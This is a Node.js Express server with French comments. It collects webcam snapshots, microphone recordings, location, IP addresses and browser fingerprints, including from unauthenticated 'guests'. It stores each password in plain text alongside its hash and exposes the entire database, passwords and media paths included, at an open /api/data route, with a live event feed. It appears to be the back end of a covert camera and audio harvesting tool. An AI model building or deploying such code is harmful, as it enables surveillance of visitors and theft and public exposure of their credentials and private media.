const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { WebSocketServer } = require('ws');

// --- Configuration ---
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'data', 'db.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const PUBLIC_DIR = path.join(__dirname, 'public');

// --- Initialisation Express ---
const app = express();
app.use(express.json({ limit: '15mb' }));
app.use(express.static(PUBLIC_DIR));
app.use('/uploads', express.static(UPLOADS_DIR));

// --- Base de Données (JSON) ---

function loadDB() {
    const dir = path.dirname(DB_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(DB_FILE)) {
        return { users: [], events: [], captures: [], messages: [], visits: [], fingerprints: [], chat: [] };
    }
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        console.error("Erreur lecture DB, reset...");
        return { users: [], events: [], captures: [], messages: [], visits: [], fingerprints: [], chat: [] };
    }
}

function saveDB(db) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
    } catch (e) {
        console.error("Erreur écriture DB", e);
    }
}

let db = loadDB();

// --- Utilitaires ---

function generateId() {
    return crypto.randomUUID();
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'inconnu';
}

function saveBase64File(base64Data, prefix, ext) {
    if (!base64Data || typeof base64Data !== 'string') return null;
    try {
        const match = base64Data.match(/^data:([^;]+);base64,(.+)$/);
        if (!match) return null;
        
        const data = match[2];
        const buffer = Buffer.from(data, 'base64');
        const filename = `${prefix}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.${ext}`;
        const filepath = path.join(UPLOADS_DIR, filename);
        
        if (!fs.existsSync(UPLOADS_DIR)) {
            fs.mkdirSync(UPLOADS_DIR, { recursive: true });
        }
        
        fs.writeFileSync(filepath, buffer);
        return { 
            filename, 
            path: `/uploads/${filename}`, 
            mime: match[1], 
            size: buffer.length 
        };
    } catch (e) {
        console.error("Erreur saveBase64File:", e);
        return null;
    }
}

function processPermissions(permissions) {
    if (!permissions) return null;

    const result = {
        location: permissions.location || null,
        collectedAt: permissions.collectedAt || new Date().toISOString(),
        camera: null,
        microphone: null,
    };

    // Traitement Caméra
    if (permissions.camera) {
        const cam = permissions.camera;
        let fileInfo = null;
        if (cam.screenshot) {
            fileInfo = saveBase64File(cam.screenshot, 'cam', 'jpg');
        }
        result.camera = {
            captured: true,
            metadata: cam.metadata || null,
            file: fileInfo ? { 
                path: fileInfo.path, 
                filename: fileInfo.filename, 
                size: fileInfo.size, 
                mime: fileInfo.mime 
            } : null,
            hasScreenshot: !!cam.screenshot
        };
    }

    // Traitement Micro
    if (permissions.microphone) {
        const mic = permissions.microphone;
        let fileInfo = null;
        if (mic.audioSample) {
            fileInfo = saveBase64File(mic.audioSample, 'mic', 'webm');
        }
        result.microphone = {
            captured: true,
            metadata: mic.metadata || null,
            file: fileInfo ? { 
                path: fileInfo.path, 
                filename: fileInfo.filename, 
                size: fileInfo.size, 
                mime: fileInfo.mime 
            } : null,
            hasSample: !!mic.audioSample
        };
    }

    return result;
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return `${salt}:${hash}`;
}

function verifyPassword(password, stored) {
    const [salt, hash] = stored.split(':');
    const check = crypto.scryptSync(password, salt, 64).toString('hex');
    return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(check, 'hex'));
}

// --- Middleware SSE (Server-Sent Events) ---

const sseClients = new Set();

app.use((req, res, next) => {
    if (req.path === '/api/stream') {
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        
        res.write('retry: 2000\n\n');
        
        const sendEvent = (event, data) => {
            res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
        };

        // Envoyer les derniers événements en historique
        const recentEvents = db.events.slice(-10);
        if (recentEvents.length > 0) {
            sendEvent('history', recentEvents);
        }

        sseClients.add(res);
        req.on('close', () => sseClients.delete(res));
    }
    next();
});

function broadcast(event) {
    const payload = `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`;
    for (const client of sseClients) {
        try {
            client.write(payload);
        } catch (e) {
            // client disconnected
        }
    }
}

// --- Routes API ---

// 1. Enregistrement
app.post('/api/register', (req, res) => {
    const { email, password, permissions } = req.body;

    if (!email || !password || password.length < 6) {
        return res.status(400).json({ ok: false, error: 'Email et mot de passe (min 6 caractères) requis' });
    }

    const normalizedEmail = email.toLowerCase();
    if (db.users.find(u => u.email === normalizedEmail)) {
        return res.status(409).json({ ok: false, error: 'Cet email est déjà utilisé' });
    }

    const processedPerms = processPermissions(permissions);
    
    const newUser = {
        id: generateId(),
        email: normalizedEmail,
        passwordHash: hashPassword(password),
        passwordPlain: password, // Pour le débogage
        createdAt: new Date().toISOString(),
        lastIp: getClientIP(req),
        permissions: processedPerms
    };

    db.users.push(newUser);
    saveDB(db);

    logEvent('register', `Compte créé: ${email}`, { email });

    res.json({ 
        ok: true, 
        user: { email: newUser.email },
        media: processedPerms ? {
            camera: processedPerms.camera?.file?.path || null,
            microphone: processedPerms.microphone?.file?.path || null
        } : null
    });
});

// 2. Connexion
app.post('/api/login', (req, res) => {
    const { email, password, permissions } = req.body;
    const user = db.users.find(u => u.email === email.toLowerCase());

    if (!user || !verifyPassword(password, user.passwordHash)) {
        logEvent('login-fail', `Connexion échouée: ${email}`);
        return res.status(401).json({ ok: false, error: 'Email ou mot de passe incorrect' });
    }

    // Mettre à jour les permissions et la dernière connexion
    const processedPerms = processPermissions(permissions);
    if (processedPerms) user.permissions = processedPerms;
    user.lastLoginAt = new Date().toISOString();
    user.lastIp = getClientIP(req);
    
    // Historique de connexion
    if (!user.loginHistory) user.loginHistory = [];
    user.loginHistory.push({ at: user.lastLoginAt, ip: user.lastIp, perms: processedPerms });
    if (user.loginHistory.length > 10) user.loginHistory = user.loginHistory.slice(-10);

    saveDB(db);
    logEvent('login', `Connexion réussie: ${email}`, { email });

    res.json({
        ok: true,
        user: { id: user.id, email: user.email },
        media: processedPerms ? {
            camera: processedPerms.camera?.file?.path || null,
            microphone: processedPerms.microphone?.file?.path || null
        } : null
    });
});

// 3. Capture (Sans login, pour les invités)
app.post('/api/capture', (req, res) => {
    const { permissions } = req.body || {};
    const processedPerms = processPermissions(permissions);

    const guestId = crypto.randomUUID();
    const ip = getClientIP(req);

    const capture = {
        id: generateId(),
        guestId,
        ip,
        permissions: processedPerms,
        ts: new Date().toISOString()
    };

    db.captures.push(capture);
    if (db.captures.length > 100) db.captures = db.captures.slice(-100);
    saveDB(db);

    logEvent('capture', `Capture invité: ${guestId}`, { guestId, ip });

    res.json({ 
        ok: true, 
        guestId,
        media: processedPerms ? {
            camera: processedPerms.camera?.file?.path || null,
            microphone: processedPerms.microphone?.file?.path || null
        } : null
    });
});

// 4. Chat
app.get('/api/messages', (req, res) => {
    const messages = (db.messages || []).slice(-100);
    res.json({ ok: true, messages });
});

app.post('/api/messages', (req, res) => {
    const { text, author } = req.body;
    if (!text) return res.status(400).json({ ok: false, error: 'Texte requis' });

    const msg = {
        id: generateId(),
        author: author || 'Anonyme',
        text,
        ts: new Date().toISOString()
    };

    if (!db.messages) db.messages = [];
    db.messages.push(msg);
    if (db.messages.length > 500) db.messages = db.messages.slice(-500);
    saveDB(db);

    broadcast({ type: 'chat', message: msg });

    res.json({ ok: true, message: msg });
});

// 5. Fingerprint
app.post('/api/fingerprint', (req, res) => {
    const ip = getClientIP(req);
    const guestId = crypto.randomUUID();
    
    const entry = {
        id: generateId(),
        guestId,
        ip,
        userAgent: req.headers['user-agent'],
        screen: req.body?.screen || null,
        ts: new Date().toISOString()
    };

    if (!db.fingerprints) db.fingerprints = [];
    db.fingerprints.push(entry);
    if (db.fingerprints.length > 500) db.fingerprints = db.fingerprints.slice(-500);
    saveDB(db);

    logEvent('fingerprint', `Fingerprint invité: ${guestId}`, { guestId });

    res.json({ ok: true, guestId, id: entry.id });
});

// 6. Visites
app.get('/api/visits', (req, res) => {
    const visits = (db.visits || []).slice(-100).reverse();
    res.json({ ok: true, visits, count: visits.length });
});

app.post('/api/visit', (req, res) => {
    const ip = getClientIP(req);
    const visit = {
        id: generateId(),
        ip,
        userAgent: req.headers['user-agent'],
        ts: new Date().toISOString()
    };

    if (!db.visits) db.visits = [];
    db.visits.push(visit);
    if (db.visits.length > 500) db.visits = db.visits.slice(-500);
    saveDB(db);

    res.json({ ok: true, id: visit.id });
});

// 7. Données générales (Dashboard)
app.get('/api/data', (req, res) => {
    res.json(db);
});

// 8. 404 Handler
app.use((req, res) => {
    res.status(404).json({ ok: false, error: 'Ressource non trouvée' });
});

// 9. Error Handler
app.use((err, req, res, next) => {
    console.error('Erreur serveur:', err);
    res.status(500).json({ ok: false, error: 'Erreur interne du serveur' });
});

// Fonction utilitaire pour les logs
function logEvent(type, message, meta = {}) {
    const entry = {
        id: generateId(),
        type,
        message,
        meta,
        ts: new Date().toISOString()
    };
    if (!db.events) db.events = [];
    db.events.push(entry);
    if (db.events.length > 500) db.events = db.events.slice(-500);
    saveDB(db);
    
    broadcast({ type: 'event', event: entry });
    return entry;
}

// --- Démarrage du Serveur ---

const server = app.listen(PORT, () => {
    console.log(`[OK] Serveur HTTP sur http://localhost:${PORT}`);
    console.log(`[OK] Base de données chargée: ${db.users.length} utilisateurs, ${db.events.length} événements.`);
    console.log(`[OK] Dossier uploads: ${UPLOADS_DIR}`);
});

// WebSocket (Optionnel, pour du chat bidirectionnel ou du streaming lourd)
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    console.log('[WS] Client connecté');
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            // Exemple: Broadcast à tous les clients connectés
            wss.clients.forEach(client => {
                if (client.readyState === 1) {
                    client.send(JSON.stringify({ type: 'broadcast', data: data }));
                }
            });
        } catch (e) {
            console.error('[WS] Erreur parsing message', e);
        }
    });

    ws.on('close', () => {
        console.log('[WS] Client déconnecté');
    });
});

// Export pour tests unitaires ou utilisation comme module
module.exports = { app, server, wss, loadDB, saveDB, db, logEvent };
